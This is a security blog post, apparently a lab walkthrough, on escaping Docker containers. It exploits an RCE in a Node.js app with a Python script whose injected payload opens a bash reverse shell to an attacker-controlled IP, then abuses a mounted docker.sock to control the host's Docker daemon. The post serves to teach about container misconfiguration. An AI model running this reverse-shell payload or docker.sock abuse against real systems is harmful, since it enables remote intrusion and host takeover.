<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Containers attacks - ways of escape container ::
        Hello Friend — A simple theme for Hugo
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="This post is I&amp;rsquo;m talking about container security topic , it&amp;rsquo;s demonstrate how a vulnerable application in dockerize environment can be critical catastrophic to enterprises.
Introduction Container technology has radically changed the way that applications are being developed and deployed. Notably, containers dramatically ease dependency management, so shipping new features or code is faster than ever before. While Docker containers and Kubernetes are great for DevOps, they also present new security challenges that both security practitioners and developers must understand and address with diligence."
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://ahmedameenaim.github.io/ahmedamin.github.io/posts/post3/" />





<link rel="stylesheet" href="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/style.css" />

<link rel="stylesheet" href="https://ahmedameenaim.github.io/ahmedamin.github.io/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="https://ahmedameenaim.github.io/ahmedamin.github.io/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="https://ahmedameenaim.github.io/ahmedamin.github.io/img/favicon.png" />


<link href="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Containers attacks - ways of escape container"/>
<meta name="twitter:description" content="This post is I&rsquo;m talking about container security topic , it&rsquo;s demonstrate how a vulnerable application in dockerize environment can be critical catastrophic to enterprises.
Introduction Container technology has radically changed the way that applications are being developed and deployed. Notably, containers dramatically ease dependency management, so shipping new features or code is faster than ever before. While Docker containers and Kubernetes are great for DevOps, they also present new security challenges that both security practitioners and developers must understand and address with diligence."/>



<meta property="og:title" content="Containers attacks - ways of escape container" />
<meta property="og:description" content="This post is I&rsquo;m talking about container security topic , it&rsquo;s demonstrate how a vulnerable application in dockerize environment can be critical catastrophic to enterprises.
Introduction Container technology has radically changed the way that applications are being developed and deployed. Notably, containers dramatically ease dependency management, so shipping new features or code is faster than ever before. While Docker containers and Kubernetes are great for DevOps, they also present new security challenges that both security practitioners and developers must understand and address with diligence." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ahmedameenaim.github.io/ahmedamin.github.io/posts/post3/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-06-27T00:53:51&#43;02:00" />
<meta property="article:modified_time" content="2021-06-27T00:53:51&#43;02:00" /><meta property="og:site_name" content="Hello Friend" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="https://ahmedameenaim.github.io/ahmedamin.github.io"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Welcome to the Rabbit Hole</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/ahmedamin.github.io/about">About</a></li>
        
      
        
          <li><a href="/ahmedamin.github.io/showcase">Showcase</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/ahmedamin.github.io/about">About</a></li>
      
    
      
        <li><a href="/ahmedamin.github.io/showcase">Showcase</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Containers attacks - ways of escape container</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2021-06-27
        </span>

        
          
        
      

      
        <span class="post-author"
          >— Written by Ahmed Amin</span
        >


      
        <span class="post-read-time"
          >— 5 min read</span
        >
      
    </div>

    

    
      <figure class="post-cover">
        
          <img src="https://ahmedameenaim.github.io/ahmedamin.github.io/amcO9glU.jpg" alt="Containers attacks - ways of escape container" />
        

        
      </figure>
    

    <div class="post-content">
      
      <p>This post is I&rsquo;m talking about container security topic , it&rsquo;s demonstrate how a vulnerable application in dockerize environment can be critical catastrophic to enterprises.</p>
<h2 id="introduction">Introduction</h2>
<p>Container technology has radically changed the way that applications are being developed and deployed. Notably, containers dramatically ease dependency management, so shipping new features or code is faster than ever before. While Docker containers and Kubernetes are great for DevOps, they also present new security challenges that both security practitioners and developers must understand and address with diligence.</p>
<h2 id="a-brief-look-at-containers-from-a-security-perspective">A brief look at containers from a security perspective</h2>
<p>In essence, Docker containers are a wrapper around Linux control groups (cgroups) and namespaces. Cgroups are used in the Linux kernel for monitoring and restricting resources among a group of processes. Namespaces determine what a process can see. For example, the PID namespace restricts which processes can be seen within a container.</p>
<p>Each container running on a host shares a common underlying kernel. Containers are isolated from one another, which – from a security standpoint – is advantageous. However, if the host OS is compromised, all containers running on it are at risk. Similarly, if a container is using a vulnerable library, it could be exploited to gain access to the underlying host.</p>
<h2 id="a-case-study-of-deployed-vulnerable-app-image">A case-study of deployed vulnerable app-image</h2>
<p>At this case study , we have a vulnerable app in dockerize environment with bad security practices of deploying containers.in this case we gonna wear the hat of hackers and demonstrate how hackers exploits systems via vulnerable container.</p>
<p><img src="https://ahmedameenaim.github.io/ahmedamin.github.io/tXCGIDba.png" alt="images_containers.png"></p>
<p>The application is vulnerable to remote code execution vulnerability (RCE) , which lead attackers to execute command on compromised hosts , but in container application side the executed commands will be isolated from being executed on host and will be only inside the container ,that&rsquo;s way docker increased the security posture of application developed in dockerize environment , but the paradox here is that container deployed with bad practices that let attacker take advantage of those misconfiguration and able to escape the container context and compromised the whole host.</p>
<h2 id="enumeration-target">Enumeration target</h2>
<p>There is a simple nodejs app exposed to the internet and got attention of attacker to explore it.</p>
<p><img src="https://ahmedameenaim.github.io/ahmedamin.github.io/pqCAQZca.png" alt="dummy_app.png"></p>
<p>The app is greeting the visitor by reading from a specific parameter. attacker will try enumerate application in the following steps:</p>
<ul>
<li>detect app stack</li>
<li>identify all possible parameters in order to discover a flaw into the system.</li>
</ul>
<p>Attacker discovered application stack , as application exposed that it is built a top of expressjs framework as it&rsquo;s returns in every response header X-Powered-By Express upon each request was send to the app. which by the way a good information that help attacker about exploiting the system.</p>
<p><img src="https://ahmedameenaim.github.io/ahmedamin.github.io/KZsGFLL6.png" alt="stack_app.png"></p>
<p>Attacker fuzzing parameters by observing the server status code and identified one which called &lsquo;q&rsquo; . in order to try exploit application.</p>
<p><img src="https://ahmedameenaim.github.io/ahmedamin.github.io/hEo8LbVA.png" alt="fuzzing_param.png"></p>
<p>Exploit target
we already know that app is vulnerable to rce which let us ablt to execute code on remote target. as we know that app build with javascript .</p>
<ol>
<li>we gonna write a python code that execute a reverse tcp connection written in javascript so we get into the container.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests

print <span style="color:#e6db74">&#34;[*] start attacking&#34;</span>

target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.57.103/?q=&#34;</span>

print <span style="color:#e6db74">&#34;[+] prepare payload&#34;</span>

reverse_shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;require(&#39;child_process&#39;).exec(&#39;bash -c %22bash -i &gt;%26 /dev/tcp/192.168.1.15/6000 0&gt;</span><span style="color:#e6db74">%261%</span><span style="color:#e6db74">22&#39;)&#34;</span>

print <span style="color:#e6db74">&#34;[+] trying injecting target&#34;</span>

response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>target<span style="color:#f92672">+</span>reverse_shell)

print <span style="color:#e6db74">&#34;[+] receive your reverse shell&#34;</span>
</code></pre></div><ol start="2">
<li>open ncat listener so we receive the return connection to our machine.</li>
</ol>
<p><img src="https://ahmedameenaim.github.io/ahmedamin.github.io/kTU94a5c.png" alt="listening_port.png"></p>
<ol start="3">
<li>start the exploit and receive the reverse shell.</li>
</ol>
<p><img src="https://ahmedameenaim.github.io/ahmedamin.github.io/nMo8uBwO.png" alt="shell.png"></p>
<p>Right now we are execute commands into context of container not the actual host , so we want to escape the container namespace and be able to execute commands directly to the host.
<img src="https://ahmedameenaim.github.io/ahmedamin.github.io/lYYEbxGP.png" alt="etc/passwd.png"></p>
<h2 id="misconfiguration-mounting-dockersock-file-inside-container">Misconfiguration (mounting docker.sock file inside container)</h2>
<h3 id="what-is-dockersock-file-">What is docker.sock file ?</h3>
<blockquote>
<p>docker. sock is the UNIX socket that Docker daemon is listening to. It&rsquo;s the main entry point for Docker API. It also can be TCP socket but by default for security reasons Docker defaults to use UNIX socket. Docker cli client uses this socket to execute docker commands by default.</p>
</blockquote>
<p>so if we have a docker.sock file , we can communicate directly with docker daemon api which able to execute command on the machine host. the default directory of that file located in /var/run/docker.sock path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@9c87389b1761:/usr/src/app# ls /var/run | grep docker.sock
ls /var/run | grep docker.sock
docker.sock
</code></pre></div><p>attacker try to enumerate for existence of docker-cli client.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@9c87389b1761:/usr/src/app#   find / -name docker
find / -name docker
/run/docker
/root/docker
/root/docker/docker
</code></pre></div><p>It&rsquo;s turns out that operational mounted docker socket and docker-cli from the host into container, now attacker able to communicate with docker demon and can execute commands directly on the host</p>
<p>So attacker can monitor docker demon run-time process and enumerate running container on compromised host.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@9c87389b1761:~/docker# ./docker -H unix:///var/run/docker.sock ps

CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS              PORTS              NAMES
9c87389b1761        node-app-rce               pm2 start app.js         <span style="color:#ae81ff">2</span> years ago         Up <span style="color:#ae81ff">18</span> minutes       0.0.0.0:80-&gt;8080/tcp   nodeapp
fefeff8e1078        sysmon                     top                       <span style="color:#ae81ff">2</span> years ago         Up <span style="color:#ae81ff">18</span> minutes                              sysmon
</code></pre></div><p>Listing all available images in container registry repository.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@9c87389b1761:~/docker# ./docker -H unix:///var/run/docker.sock images

REPOSITORY            TAG                 IMAGE ID            CREATED                SIZE
sysmon                latest              e9d165cf1cd6        <span style="color:#ae81ff">2</span> years ago         139MB
ubuntu                latest              735f80812f90        <span style="color:#ae81ff">2</span> years ago         83.5MB
alpine                latest              11cd0b38bc3c        <span style="color:#ae81ff">2</span> years ago         4.41MB
node-app-rce          latest              da4154bb4bcf        <span style="color:#ae81ff">3</span> years ago         253MB
</code></pre></div><p>Attack vectors (Docker demon)
The attack surface that available to attackers from compromised container.</p>
<p>Attackers can terminate or delete container in your infrastructure.
Attackers can steal source code , secrets and credentials that exist inside container.
Attackers can hijack your resources via deploying container for mining cryptocurrencies.
Attacker can work on persistence inside your infrastructure and explore internal services.</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="https://ahmedameenaim.github.io/ahmedamin.github.io/posts/post2/">
                  <span class="button__text">Istio Security (securing microservices traffic with istio)</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="https://ahmedameenaim.github.io/ahmedamin.github.io"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Welcome to the Rabbit Hole</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span
          >© 2021 Powered by
          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
        >
        <span
          >Theme created by
          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
        >
      </div>
    
  </div>
</footer>

<script src="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/main.js"></script>
<script src="https://ahmedameenaim.github.io/ahmedamin.github.io/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
